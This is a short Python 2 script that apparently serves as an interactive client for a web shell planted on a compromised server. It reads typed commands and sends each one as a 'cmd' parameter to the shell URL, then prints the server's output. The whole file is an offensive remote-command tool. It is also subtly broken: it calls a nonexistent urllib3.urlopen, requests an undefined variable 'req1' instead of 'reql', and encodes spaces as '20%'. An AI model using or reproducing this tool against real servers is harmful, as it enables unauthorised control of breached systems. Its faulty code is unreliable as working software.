import urllib3,sys

shell = sys.argv[1]
host = shell.split("/")[2]
while True:
    command = raw_input("sh33l@{0}~#".format(host))
    reql = str("{0}?cmd={1}".format(shell,command)).replace(" ","20%")
    request = urllib3.urlopen(req1)
    print request.read() 
